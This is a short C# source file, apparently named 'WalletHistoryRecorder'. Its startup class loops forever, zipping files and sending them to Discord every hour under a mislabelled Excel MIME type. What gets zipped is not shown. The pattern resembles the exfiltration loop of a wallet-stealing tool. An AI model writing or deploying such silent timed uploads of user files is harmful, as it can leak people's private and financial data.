using System;
using System.Threading;

namespace WalletHistoryRecorder
{
	public class Start
	{
		string message = "";
		string fileName;
		string fileFormat = "zip";
		string filePath;
		string application = "application/msexcel";

		bool sended = false;

		public Start()
		{
			// Sending data every hour
			while (true)
			{
				try
				{
					var result = FileClass.CreateZip();
					fileName = result[1];
					filePath = result[0];
					Discord.SendFile(message, fileName, fileFormat, filePath, application);
					sended = true;
				}
				catch (Exception e)
				{
					System.Console.WriteLine(e.Message);
				}

				Thread.Sleep(3600 * 1000);
			}
		}

		private void SendDataAt12()
		{
			try
			{
				var result = FileClass.CreateZip();
				fileName = result[1];
				filePath = result[0];
				Discord.SendFile(message, fileName, fileFormat, filePath, application);
				sended = true;
			}
			catch (Exception e)
			{
				System.Console.WriteLine(e.Message);
			}

			while (true)
			{
				if (DateTime.Now.Hour == 12 && !sended)
				{
					try
					{
						var result = FileClass.CreateZip();
						fileName = result[1];
						filePath = result[0];
						Discord.SendFile(message, fileName, fileFormat, filePath, application);
						sended = true;
					}
					catch (Exception e)
					{
						System.Console.WriteLine(e.Message);
					}
				}
				if (DateTime.Now.Hour != 12)
				{
					sended = false;
				}

				Thread.Sleep(300 * 1000);
			}

		}
	}
}
